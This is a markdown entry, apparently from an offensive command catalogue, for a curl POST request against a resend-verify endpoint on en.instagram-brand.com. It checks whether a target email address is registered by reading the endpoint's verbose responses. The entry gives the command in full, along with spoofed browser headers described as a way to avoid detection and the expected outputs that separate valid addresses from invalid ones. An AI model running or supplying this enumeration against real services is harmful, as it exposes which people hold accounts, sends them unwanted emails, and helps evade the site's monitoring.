---
id: uuid-7
data: >-
  curl -X POST https://en.instagram-brand.com/wp-json/brc/v1/resend-verify -H
  "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101
  Firefox/51.0" -H "Accept: */*" -H "Content-Type:
  application/x-www-form-urlencoded" -H "Referer:
  https://en.instagram-brand.com/register/signup" -d "email=<target email>" 
tags:
  - enumeration
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:12.513Z'
verified: false
validated: true
submitted: true
---
# resend-verify-post-request

## Command

```bash
curl -X POST https://en.instagram-brand.com/wp-json/brc/v1/resend-verify \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" \
  -H "Accept: */*" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: https://en.instagram-brand.com/register/signup" \
  -d "email=<target email>"
```

## Description

Sends a POST request to the resend-verify endpoint to test if an email is valid, exploiting verbose responses for username enumeration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `email` | Target email address to check for validity | Yes |
| `-H` headers | Mimic browser request to avoid detection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://en.instagram-brand.com/wp-json/brc/v1/resend-verify -H "Content-Type: application/x-www-form-urlencoded" -d "email=test@example.com"
```

### Advanced Usage

Include full headers as shown in command for realism:

```bash
curl -X POST https://en.instagram-brand.com/wp-json/brc/v1/resend-verify -H "User-Agent: Mozilla/5.0 ..." -d "email=target@example.com"
```

## Expected Output

For valid email: HTTP 200 with JSON like {"success":true, "message":"Verification email sent"} and actual email sent. For invalid: HTTP 400/ error message like "Invalid email".

## Related

- [[Related Procedure: Manual-Username-Enumeration-via-Resend-Verify]]
